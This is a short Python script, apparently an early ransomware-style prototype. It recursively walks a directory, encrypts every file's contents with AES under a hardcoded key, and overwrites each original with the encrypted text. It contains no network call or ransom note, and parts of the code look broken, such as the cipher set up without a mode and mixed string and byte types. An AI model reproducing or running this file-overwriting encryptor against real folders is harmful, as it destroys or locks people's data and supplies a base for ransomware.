from Crypto.Cipher import AES
import base64
import os
import glob
# filename = raw_input("Filename:")
path = '/Users/dev/Desktop/testfiles/'




for filename in glob.iglob(path + '**/*', recursive=True):
    print(filename)
    # if not os.path.exists(filename):
    #     SystemExit()
    if os.path.isfile(filename) == True:
        file = open(filename)
        text = file.read()
        print(text)
        def encryption(info) :
            BLOCK_SIZE = 16
            PADDING ='{'
            pad = lambda s: s+ (BLOCK_SIZE - len(s) % BLOCK_SIZE)*PADDING
            key = 'CE10BDC7BDF43EDE08D8A856AF1DD6B8' #os.urandom(BLOCK_SIZE)
            cipher= AES.new(key)
            EncodeAES = lambda c, s: base64.b64encode(c.encrypt (pad (s)))
            print('key')
            print (key)
            encoded = EncodeAES(cipher, info)
            print ('encoded')
            print (encoded)
            return encoded

        outputText = encryption(text)
        print('Pre output text')
        print(outputText)
        print('Text done')

        file = open(filename, "wb")
        file.write(outputText)
        file.close()
        print('File done')
    
print('Program done')